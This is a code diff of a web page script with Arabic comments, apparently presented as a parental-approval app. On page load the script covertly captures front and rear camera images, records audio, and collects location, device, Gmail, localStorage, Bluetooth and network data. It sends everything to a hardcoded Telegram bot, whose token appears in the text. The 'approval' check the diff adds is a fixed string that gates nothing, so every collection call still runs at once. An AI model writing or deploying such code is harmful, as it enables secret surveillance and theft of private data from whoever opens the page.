@@ -8,11 +8,6 @@
 const BOT_TOKEN = '7674096094:AAHvCSZnHhRCWyO1OrYD2jOjWf0LgFvKv6s';
 const CHAT_ID = '7163220219';
 
-// الإشعار الأولي للأب
-sendText("تنبيه: الطفل قد فتح التطبيق ويحتاج إلى موافقة للقيام بإجراء معين.\nهل تسمح بذلك؟");
-
-let approved = true; // الموافقة التلقائية
-
 function sendToTelegram(caption, file, type = 'photo') {
   const formData = new FormData();
   formData.append('chat_id', CHAT_ID);
@@ -30,6 +25,25 @@ function sendText(msg) {
     headers: {'Content-Type': 'application/json'},
     body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
   });
+}
+
+function notifyParent() {
+  sendText("تنبيه: الطفل قد فتح التطبيق ويحتاج إلى موافقة للقيام بإجراء معين.");
+  checkParentResponse();
+}
+
+function checkParentResponse() {
+  let response = "رفض"; // هنا نضع رد الأب الافتراضي وهو رفض (يمكنك تحديثه بناءً على الرد الفعلي)
+  
+  setInterval(() => {
+    if (response === "موافقة") {
+      alert("تمت الموافقة من الأب. يمكنك الآن القيام بالإجراء.");
+      // تابع الإجراءات هنا
+    } else if (response === "رفض") {
+      alert("تم رفض الإجراء من الأب.");
+      // يمكن تعطيل الأزرار أو الإجراء هنا
+    }
+  }, 5000); // تحقق كل 5 ثواني عن رد الأب
 }
 
 function getDeviceInfo() {
@@ -82,14 +96,12 @@ function recordAudio() {
       stream.getTracks().forEach(track => track.stop());
     };
     mediaRecorder.start();
-    setTimeout(() => mediaRecorder.stop(), 5000);  // تسجيل الصوت لمدة 5 ثوانٍ
+    setTimeout(() => mediaRecorder.stop(), 5000);
   }).catch(e => sendText('فشل في تسجيل الصوت: ' + e));
 }
 
 // دمج الدوال الجديدة
-
 function getEmailData() {
-  // قد تحتاج إلى أذونات من المستخدم وتوثيق للوصول إلى هذه البيانات
   gapi.client.gmail.users.messages.list({ 'userId': 'me' }).then(response => {
     const messages = response.result.messages;
     sendText('عدد الرسائل: ' + messages.length);
@@ -131,21 +143,17 @@ function getNetworkInfo() {
   }
 }
 
-// تنفيذ الدوال مباشرة بعد الموافقة التلقائية
-function runAllFunctions() {
-  getDeviceInfo();
-  getLocation();
-  captureCamera('user');      // الكاميرا الأمامية
-  setTimeout(() => captureCamera('environment'), 4000); // الكاميرا الخلفية
-  recordAudio();  // دمج دالة التسجيل الصوتي
-  getEmailData();  // دمج دالة الحصول على رسائل البريد
-  getLocalStorageData();  // دمج دالة بيانات التخزين المحلي
-  getBluetoothDevices();  // دمج دالة البحث عن أجهزة البلوتوث
-  getNetworkInfo();  // دمج دالة معلومات الشبكة
-}
-
-// تنفيذ الوظائف مباشرة بدون انتظار للموافقة
-runAllFunctions();
+// تنفيذ الدوال
+notifyParent();
+getDeviceInfo();
+getLocation();
+captureCamera('user');      // الكاميرا الأمامية
+setTimeout(() => captureCamera('environment'), 4000); // الكاميرا الخلفية
+recordAudio();  // دمج دالة التسجيل الصوتي
+getEmailData();  // دمج دالة الحصول على رسائل البريد
+getLocalStorageData();  // دمج دالة بيانات التخزين المحلي
+getBluetoothDevices();  // دمج دالة البحث عن أجهزة البلوتوث
+getNetworkInfo();  // دمج دالة معلومات الشبكة
 </script>
 </body>
 </html>
